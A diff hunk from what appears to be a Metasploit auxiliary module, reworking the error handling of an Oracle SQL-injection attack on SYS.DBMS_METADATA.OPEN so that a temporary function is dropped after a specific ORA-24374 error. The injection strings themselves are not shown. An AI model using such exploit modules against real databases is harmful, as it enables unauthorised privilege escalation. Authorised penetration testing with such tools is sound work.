@@ -49,19 +49,20 @@ class Metasploit3 < Msf::Auxiliary
 
 		clean = "drop function #{name}"
 
+
+		print_status("Sending function...")
+		prepare_exec(function)
+		
 		begin
-			print_status("Sending function...")
-			prepare_exec(function)
-		rescue => e
-			return
+			print_status("Attempting sql injection on SYS.DBMS_METADATA.OPEN...")
+			prepare_exec(package)
+		rescue ::OCIError => e
+			if ( e.to_s =~ /ORA-24374: define not done before fetch or execute and fetch/ )
+				print_status("Removing function '#{name}'...")
+				prepare_exec(clean)
+			else
+			end
 		end
-
-		print_status("Attempting sql injection on SYS.DBMS_METADATA.OPEN...")
-		prepare_exec(package)
-
-		print_status("Removing function '#{name}'...")
-		prepare_exec(clean)
-
 	end
 
 end
